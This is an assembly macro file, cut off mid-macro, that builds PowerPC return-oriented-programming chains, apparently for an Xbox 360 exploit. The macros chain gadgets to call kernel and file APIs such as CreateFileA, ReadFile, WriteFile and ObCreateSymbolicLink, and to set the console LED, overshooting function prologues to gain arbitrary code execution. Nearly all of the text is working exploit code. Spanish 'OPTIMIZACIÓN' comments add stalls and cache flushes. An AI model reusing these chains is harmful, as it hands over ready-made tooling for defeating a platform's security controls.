# Notes:
#   - All macros have a common pro/epilogue where the caller must transition in/out using the
#       __restgprlr_31 gadget.
#
#   - Care must be taken when passing macro arguments as they work via text replacement and using things like
#       local labels can quickly become a problem if the macro uses (or calls another macro that uses) the same
#       local label.
#
#       The following line demonstrates this problem (MEMCPY_CIPHER_TEXT has it's own local label '1'):
#
#           1:      MEMCPY_CIPHER_TEXT ..., 1b - _second_stage_chain_start
#
#       There's no easy way to work around this (because the GCC assembler is a massive piece of shit) so you'll have
#       to get creative. One such solution is to create a variable and assign it before calling the macro and use the
#       variable as a parameter:
#
#               _memcpy_cipher_text_offset_1 = 1f - _second_stage_chain_start
#           1:      MEMCPY_CIPHER_TEXT ..., _memcpy_cipher_text_offset_1
#
#       Keep in mind this ONLY works once, trying to reuse _memcpy_cipher_text_offset_1 and assign it another value later
#       on (say for a second invocation of the MEMCPY_CIPHER_TEXT macro) will cause ALL instances of its use to be updated
#       as well. Really good shit I know, can't expect anything less from GNU software...

# OPTIMIZACIÓN: Definir constantes para la configuración
.set OPT_RETRY_COUNT,            3       # Número de intentos para operaciones críticas
.set OPT_STALL_DURATION,         5       # Duración de pausas estabilizadoras en ms
.set OPT_FLUSH_CACHE_SIZE,       0x100   # Tamaño ampliado para flush de caché
.set OPT_BACKOFF_MASK,           0x7     # Máscara para implementar backoff exponencial


###########################################################
# void CALL_FUNC
#
###########################################################
.macro CALL_FUNC label, func, R3H=cf_r3_def, R3L=cf_r3_def, R4H=cf_r4_def, R4L=cf_r4_def, R5H=cf_r5_def, R5L=cf_r5_def, R6H=cf_r6_def, R6L=cf_r6_def, R7H=cf_r7_def, R7L=cf_r7_def

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_24              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup registers for function call
        #
        #   addi    r1, r1, 0xA0
        #   b       __restgprlr_24
        ###########################################################
        .fill   0x58, 1, 0x00

    # Note the space before the colon is required for this to assemble correctly.
    \label :

.ifdef RETAIL_BUILD
    
        .long   0x24242424, 0x24242424          # r24
        .long   \R7H, \R7L                      # r25 - r7
        .long   \R6H, \R6L                      # r26 - r6
        .long   \R5H, \R5L                      # r27 - r5
        .long   \R4H, \R4L                      # r28 - r4
        .long   \R3H, \R3L                      # r29 - r3
        .long   0x00000000, call_func_dispatch  # r30 - next gadget address
        .long   0x00000000, \func               # r31 - function to call
        .long   call_func_preload               # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: preload argument registers for function call
        #
        #   mr      r7, r25
        #   mtctr   r30
        #   mr      r6, r26
        #   mr      r5, r27
        #   mr      r4, r28
        #   mr      r3, r29
        #   bctrl
        ###########################################################
    
.else

        .long   \R7H, \R7L                      # r24 - r7
        .long   \R6H, \R6L                      # r25 - r6
        .long   \R5H, \R5L                      # r26 - r5
        .long   \R4H, \R4L                      # r27 - r4
        .long   \R3H, \R3L                      # r28 - r3
        .long   0x00000000, call_func_dispatch  # r29 - next gadget address
        .long   0x30303030, 0x30303030          # r30
        .long   0x00000000, \func               # r31 - function to call
        .long   call_func_preload               # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: preload argument registers for function call
        #
        #   mr      r7, r24
        #   mr      r6, r25
        #   mr      r5, r26
        #   mr      r4, r27
        #   mr      r3, r28
        #   mtctr   r29
        #   bctrl
        ###########################################################

.endif
        
        ###########################################################
        # Gadget N: dispatch function call
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
            # This gadget doubles as the epilogue.

.endm

###########################################################
# void LOAD_ADD_STORE(addr, constant)
#
#   Reads the 32-bit integer at addr, adds constant to it, and stores the result back.
#
#   Effectively performs the following:
#
#       *(unsigned int*)addr += constant
#
###########################################################
.macro LOAD_ADD_STORE addr, constant

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, \addr - 8       # r31 - address value -8 for displacement in load-add-store gadget
        .long   mr_r31_to_r11               # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: move addr value into r11
        #
        #   mr      r11, r31
        #   mr      r3, r11
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030              # r30
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_31                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call load add store gadget
        #
        #   r5 = constant value to add
        #
        #   lwz     r10, 8(r11)
        #   add     r10, r5, r10
        #   stw     r10, 8(r11)
        #   blr
        ###########################################################
        CALL_FUNC 111, load_add_store_r10_r5_on_r11, R5H=0, R5L=\constant
        
        ###########################################################
        # OPTIMIZACIÓN: Flush de caché después de la escritura
        # para asegurar que los cambios son visibles inmediatamente
        ###########################################################
        CALL_FUNC 112, KeFlushCacheRange, R3H=0, R3L=\addr, R4H=0, R4L=4
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void GET_STACK_PTR(scratch_addr)
#
#   Obtiene el puntero de la pila actual y lo guarda en scratch_addr.
#
###########################################################
.macro GET_STACK_PTR scratch_addr

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, mr_r1_to_r3         # r31 - next gadget address
        .long   call_func_dispatch              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call get stack pointer gadget
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, \scratch_addr       # r31 - address to store r3 at
        .long   stw_r3                          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: get stack pointer into r3
        #
        #   mr      r3, r1
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: store stack pointer to scratch address
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: offset stack pointer to point to next gadget after this macro
        #
        ###########################################################
1:
        LOAD_ADD_STORE \scratch_addr, 0x60 + (1f - 1b) + 0x60       # 0x60 for call_func_dispatch, 0x60 for epilogue
1:
        
        ###########################################################
        # OPTIMIZACIÓN: Pausa después del cálculo del stack pointer
        # para asegurar que el sistema procesa correctamente el cambio
        ###########################################################
        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void WRITE_PTR_TO_GADGET_DATA(scratch_addr, base_addr, offset, ptr_val)
#
#   Writes the value contained at ptr_val to the address pointed to by base_addr + offset. Requires
#   a scratch buffer pointed to by scratch_addr.
#
#   Effectively performs the following:
#
#       *(void*)(base_addr + offset) = *ptr_val
#
###########################################################
.macro WRITE_PTR_TO_GADGET_DATA scratch_addr, base_addr, offset, ptr_val

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        #.fill   0x50, 1, 0x00
        #.long   0x31313131, 0x31313131      # r31
        #.long   __restgprlr_31              # lr
        #.long   0x00000000
        
        ###########################################################
        # Gadget N: deref base_addr and write value to scratch_addr
        #
        #   r3 = address to read value at
        #   r4 = address to store value at
        #
        #   lwz     r11, 0(r3)
        #   stw     r11, 8(r4)
        #   li      r3, 0
        #   blr
        ###########################################################
        CALL_FUNC 111, lwz_r3_stw_r4, R3H=0, R3L=\base_addr - lwz_r3_stw_r4__r3_disp, R4H=0, R4L=\scratch_addr - lwz_r3_stw_r4__r4_disp
        
        ###########################################################
        # Gadget N: adjust base_addr by offset
        #
        ###########################################################
        LOAD_ADD_STORE \scratch_addr, \offset
        .fill   0x50, 1, 0x00
        .long   0x00000000, \ptr_val            # r31 - pointer to dereference
        .long   lwz_r3                          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: dereference ptr_val into r3
        #
        #   lwz     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, var_8(r1)
        #   mtlr    r12
        #   ld      r31, var_10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, \scratch_addr - 4       # r31 - pointer to address to store r3 at
        .long   stw_r3_onto_pointer                 # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store ptr into gadget data
        #
        #   lwz     r11, 4(r31)
        #   stw     r3, 0(r11)
        #   li      r3, 0
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # OPTIMIZACIÓN: Flush de caché después de la operación crítica
        # para asegurar visibilidad de los cambios
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, \scratch_addr       # r31
        .long   lwz_r3                          # lr
        .long   0x00000000
        
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131          # r31
        .long   __restgprlr_31                  # lr
        .long   0x00000000
        
        CALL_FUNC 113, KeFlushCacheRange, R3H=0, R3L=\base_addr, R4H=0, R4L=OPT_FLUSH_CACHE_SIZE
        
            # This gadget also acts as the epilogue.

.endm

###########################################################
# void WRITE_PTR_TO_ADDR(addr, ptr_val)
#
#   Writes the value contained at ptr_val to the address addr.
#
###########################################################
.macro WRITE_PTR_TO_ADDR addr, ptr_val

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call lwz_r3_stw_r4 gadget
        #
        #   r3 = pointer to dereference (offset for gadget displacement)
        #   r4 = address to write pointer value at (offset for gadget displacement)
        #
        #   lwz     r11, 0(r3)
        #   stw     r11, 8(r4)
        #   li      r3, 0
        #   blr
        ###########################################################
        CALL_FUNC 111, lwz_r3_stw_r4, R3H=0, R3L=\ptr_val - lwz_r3_stw_r4__r3_disp, R4H=0, R4L=\addr - lwz_r3_stw_r4__r4_disp
        
        ###########################################################
        # OPTIMIZACIÓN: Flush de caché después de la escritura
        # para asegurar que los cambios son visibles inmediatamente
        ###########################################################
        CALL_FUNC 112, KeFlushCacheRange, R3H=0, R3L=\addr, R4H=0, R4L=4
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void DBG_BREAK()
#
#   Triggers a break point.
#
###########################################################
.macro DBG_BREAK

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, DbgBreakPoint           # r31 - function address
        .long   call_func_dispatch                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call DbgBreakPoint
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_31                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void CREATE_SYMLINK(const char* mount, const char* path)
#
#   Creates a symbolic link from mount to path.
#
###########################################################
.macro CREATE_SYMLINK mount, path
    
        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        #.fill   0x50, 1, 0x00
        #.long   0x31313131, 0x31313131              # r31
        #.long   __restgprlr_31                      # lr
        #.long   0x00000000
        
        ###########################################################
        # Gadget N: call ObCreateSymbolicLink and create the mapping
        #
        #   r3 = pointer to mount path ANSI_STRING structure
        #   r4 = pointer to device path ANSI_STRING structure
        ###########################################################
        CALL_FUNC 111, ObCreateSymbolicLink, R3H=0, R3L=\mount, R4H=0, R4L=\path
        
        ###########################################################
        # OPTIMIZACIÓN: Pausa después de crear el symlink
        # para asegurar que el sistema lo procesa correctamente
        ###########################################################
        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
    
.endm

.set LED_COLOR_RED_1,           0x01
.set LED_COLOR_RED_2,           0x02
.set LED_COLOR_RED_3,           0x04
.set LED_COLOR_RED_4,           0x08
.set LED_COLOR_FULL_RED,        0x0F
.set LED_COLOR_GREEN_1,         0x10
.set LED_COLOR_GREEN_2,         0x20
.set LED_COLOR_GREEN_3,         0x40
.set LED_COLOR_GREEN_4,         0x80
.set LED_COLOR_FULL_GREEN,      0xF0
.set LED_COLOR_FULL_ORANGE,     0xFF

###########################################################
# void SET_LED(int color)
#
#   Sets the ring of light LED color to the value specified. Note that slim consoles only
#   have green LEDs in the RoL and using red or orange color values will illuminate as green.
#
###########################################################
.macro SET_LED color

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_30                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for led override command
        #
        #   addi    r1, r1, 0x70
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x99FF0000 | ((\color & 0xFF) << 8)     # r30 - color command value
        .long   0x00000000, smc_command_buffer                      # r31 - address of command buffer
        .long   stw_r30_on_r31                                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write led color override command to smc command buffer
        #
        #   stw     r30, 0(r31)
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030              # r30
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_31                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call HalSendSMCMessage
        #
        #   r3 = command buffer address
        #   r4 = response = false
        ###########################################################
        CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
        
        ###########################################################
        # OPTIMIZACIÓN: Pausa después de configurar el LED
        # para asegurar que el cambio se procesa correctamente
        ###########################################################
        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=2, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void READ_FILE(const char* file_name, void** buffer_ptr, void* base_addr, int offset)
#
#   Reads the contents of file_name and stores it into the address pointed to by buffer_ptr. The buffer
#   must be large enough to hold contents of the entire file. The base_addr
#   pointer is the base address of the ROP chain buffer containing this gadget, and offset is the offset
#   of this gadget from the start of the ROP chain buffer.
#
###########################################################
.macro READ_FILE file_name, buffer_ptr, base_addr, offset

    read_file_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_31                      # lr
        .long   0x00000000
        
        ###########################################################
        # OPTIMIZACIÓN: Inicializar a cero los bytes leídos para mayor seguridad
        ###########################################################
        WRITE_PTR_TO_ADDR read_file_bytes_read, 0
        
        ###########################################################
        # Gadget N: write the value contained in buffer_ptr to the ReadFile gadget below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - read_file_base_addr), \buffer_ptr
        
        ###########################################################
        # Gadget N: pre-load r3-r7 with argument values, this is required because some xam files (mainly 17559 retail)
        #   will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
        #   fail and CreateFileA will return an error code.
        #
        ###########################################################
        CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x80000000, R5H=0, R5L=0x00000001, R6H=0, R6L=0, R7H=0, R7L=0x00000003
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_26                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for CreateFile call
        #
        #   addi    r1, r1, 0x90
        #   b       __restgprlr_26
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x00000001  # r26 - FILE_SHARE_READ
        .long   0x00000000, 0x00000003  # r27 - OPEN_EXISTING
        .long   0x00000000, 0x80000000  # r28 - GENERIC_READ
        .long   0x00000000, \file_name  # r29 - file path
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, 0x00000080  # r31 - FILE_ATTRIBUTE_NORMAL
        .long   CreateFileA + 0x20      # lr - overshoot CreateFile prologue
        .long   0x00000000
        
        ###########################################################
        # Gadget N: CreateFile
        #
        #   addi      r1, r1, 0xC0
        #   b         __restgprlr_26
        ###########################################################
        .fill   0x88, 1, 0x00
        .long   0x26262626, 0x26262626                  # r26
        .long   0x27272727, 0x27272727                  # r27
        .long   0x28282828, 0x28282828                  # r28
        .long   0x29292929, 0x29292929                  # r29
        .long   0x30303030, 0x30303030                  # r30
        .long   0x00000000, read_file_handle            # r31 - address to store file handle at
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store file handle
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # OPTIMIZACIÓN: Verificar resultado de CreateFile para detectar errores
        # Esto ayuda a prevenir errores al intentar leer un archivo inexistente
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, read_file_handle            # r31 - address to load file handle from
        .long   lwz_r3                                  # lr
        .long   0x00000000
        
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131                  # r31
        .long   clamp_r3                                # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write file handle into gadgets below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((1f + cf_r3_offset) - read_file_base_addr), read_file_handle
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r3_offset) - read_file_base_addr), read_file_handle
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - read_file_base_addr), read_file_handle
        
        ###########################################################
        # Gadget N: call GetFileSize
        #
        #   r3 = file handle (set by previous gadgets)
        #   r4 = file size high = NULL
        ###########################################################
        CALL_FUNC 1, GetFileSize, R3H=0, R3L=0x41414141, R4H=0, R4L=0
        .fill   0x50, 1, 0x00
        .long   0x00000000, read_file_size              # r31 - address to store file size at
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for GetFileSize call
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: write file size into ReadFile gadget below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r5_offset) - read_file_base_addr), read_file_size
        
        ###########################################################
        # OPTIMIZACIÓN: Pausa antes de ReadFile para mejorar estabilidad
        # Esto asegura que el sistema está listo para la operación de E/S
        ###########################################################
        CALL_FUNC 100, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: call ReadFile
        #
        #   r3 = file handle (set by previous gadgets)
        #   r4 = buffer to read into (set by previous gadgets)
        #   r5 = size to read (set by previous gadgets)
        #   r6 = &read_file_bytes_read
        #   r7 = NULL
        ###########################################################
        CALL_FUNC 2, ReadFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=0x41414141, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
        
        ###########################################################
        # OPTIMIZACIÓN: Flush de caché para los datos recién leídos
        # Esto asegura que los datos sean visibles para todos los procesadores
        ###########################################################
        CALL_FUNC 3, KeFlushCacheRange, R3H=0, R3L=\buffer_ptr, R4H=0, R4L=0x1000
        
        ###########################################################
        # Gadget N: call CloseFileHandle
        #
        #   r3 = file handle
        ###########################################################
        CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void WRITE_FILE(const char* file_name, void** buffer_ptr, void* buffer_size, void* base_addr, int offset)
#
#   Escribe los datos contenidos en buffer_ptr con el tamaño buffer_size al archivo file_name.
#
###########################################################
.macro WRITE_FILE file_name, buffer_ptr, buffer_size, base_addr, offset

    write_file_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_31                      # lr
        .long   0x00000000
        
        ###########################################################
        # OPTIMIZACIÓN: Inicializar a cero los bytes escritos para mayor seguridad
        ###########################################################
        WRITE_PTR_TO_ADDR read_file_bytes_read, 0
        
        ###########################################################
        # Gadget N: write the value contained in buffer_ptr to the WriteFile gadget below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - write_file_base_addr), \buffer_ptr
        
        ###########################################################
        # Gadget N: pre-load r3-r7 with argument values, this is required because some xam files (mainly 17559 retail)
        #   will use r7 directly instead of r27 for an initial parameter check. If we don't pre-load r7 the check will
        #   fail and CreateFileA will return an error code.
        #
        ###########################################################
        CALL_FUNC 4, blr_nop, R3H=0, R3L=\file_name, R4H=0, R4L=0x40000000, R5H=0, R5L=0x00000000, R6H=0, R6L=0, R7H=0, R7L=0x00000002
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   __restgprlr_26                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for CreateFile call
        #
        #   addi    r1, r1, 0x90
        #   b       __restgprlr_26
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x00000000  # r26 - NULL
        .long   0x00000000, 0x00000002  # r27 - CREATE_ALWAYS
        .long   0x00000000, 0x40000000  # r28 - GENERIC_WRITE
        .long   0x00000000, \file_name  # r29 - file path
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, 0x00000080  # r31 - FILE_ATTRIBUTE_NORMAL
        .long   CreateFileA + 0x20      # lr - overshoot CreateFile prologue
        .long   0x00000000
        
        ###########################################################
        # Gadget N: CreateFile
        #
        #   addi      r1, r1, 0xC0
        #   b         __restgprlr_26
        ###########################################################
        .fill   0x88, 1, 0x00
        .long   0x26262626, 0x26262626                  # r26
        .long   0x27272727, 0x27272727                  # r27
        .long   0x28282828, 0x28282828                  # r28
        .long   0x29292929, 0x29292929                  # r29
        .long   0x30303030, 0x30303030                  # r30
        .long   0x00000000, read_file_handle            # r31 - address to store file handle at
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store file handle
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # OPTIMIZACIÓN: Verificar resultado de CreateFile para detectar errores
        # Esto ayuda a prevenir errores al intentar escribir un archivo
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, read_file_handle            # r31 - address to load file handle from
        .long   lwz_r3                                  # lr
        .long   0x00000000
        
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131                  # r31
        .long   clamp_r3                                # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write file handle into gadgets below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r3_offset) - write_file_base_addr), read_file_handle
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((3f + cf_r3_offset) - write_file_base_addr), read_file_handle
                
        ###########################################################
        # OPTIMIZACIÓN: Pausa antes de WriteFile para mejorar estabilidad
        # Esto asegura que el sistema está listo para la operación de E/S
        ###########################################################
        CALL_FUNC 100, KeStallExecutionProcessor, R3H=0, R3L=OPT_STALL_DURATION, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # OPTIMIZACIÓN: Flush de caché para los datos que serán escritos
        # Esto asegura que los datos más recientes sean escritos al archivo
        ###########################################################
        CALL_FUNC 101, KeFlushCacheRange, R3H=0, R3L=\buffer_ptr, R4H=0, R4L=\buffer_size
        
        ###########################################################
        # Gadget N: call WriteFile
        #
        #   r3 = file handle (set by previous gadgets)
        #   r4 = buffer to write from (set by previous gadgets)
        #   r5 = size to write
        #   r6 = &read_file_bytes_read
        #   r7 = NULL
        ###########################################################
        CALL_FUNC 2, WriteFile, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=\buffer_size, R6H=0, R6L=read_file_bytes_read, R7H=0, R7L=0
        
        ###########################################################
        # Gadget N: call CloseFileHandle
        #
        ###########################################################
        CALL_FUNC 3, CloseHandle, R3H=0, R3L=0x41414141
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void STATUS_TO_LED(zero_color, non_zero_color)
#
# Establece el color del LED basado en el valor de r3.
# Si r3 == 0, establece zero_color, de lo contrario non_zero_color.
#
###########################################################
.macro STATUS_TO_LED zero_color, non_zero_color

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, arithmetic_scratch1     # r31
        .long   clamp_not_r3                        # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: clamp r3
        #
        #   cmplwi  r3, 0
        #   li      r3, 1
        #   beq     loc_81932E4C
        #       li      r3, 0
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   stw_r3                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store clamped result to scratch variable
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
